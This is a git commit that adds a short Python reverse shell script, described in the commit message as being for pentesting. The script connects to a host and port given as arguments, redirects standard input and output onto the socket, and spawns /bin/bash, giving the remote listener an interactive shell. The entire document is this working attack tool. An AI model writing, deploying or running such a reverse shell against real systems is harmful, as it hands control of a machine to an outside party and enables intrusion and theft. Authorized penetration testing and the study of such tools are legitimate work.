b78adce2216acb2a5a9c9c678b415a5db97ee2fd
Luciano Vieira <lucianovieiradev@gmail.com>
2024-04-17 23:00:49 -0300

    feature: reverse shell for pentesting

---
+++ reverseshell.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python3
+
+import os
+import pty
+import socket
+import sys
+
+if len(sys.argv) != 3:
+    print("error: wrong number of arguments", file=sys.stderr)
+    print("usage: %s <host> <port>" % sys.argv[0])
+    exit(1)
+
+ip, port = sys.argv[1:]
+
+sock = socket.socket()
+sock.connect((ip, int(port)))
+
+input("Conected.... zzZZzzzzZzzzZZ")
+for fd in range(0, 3):
+    os.dup2(sock.fileno(), fd)
+    pty.spawn("/bin/bash")
+
+print("connecting to %s:%s" % (ip, port))
